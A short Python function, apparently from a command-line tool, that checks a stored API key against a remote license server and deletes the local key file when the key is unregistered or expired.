def cek_apikey():
	key = open(".__apikey__.txt","r").read()
	cek = requests.get("https://james.anggakurniawan.my.id/chek.php?project=license&apikey="+key).json()
	if cek["status"] == "error":
		print(" [!] Token Not Register")
		os.system("rm -f .__apikey__.txt")
	elif cek["status"] == "expired":
		print(" [!] Your Token Has Been Expire")
		os.system("rm -f .__apikey__.txt")
	else:
		open(".__apikey__.txt","w").write(key)
		return main_button()
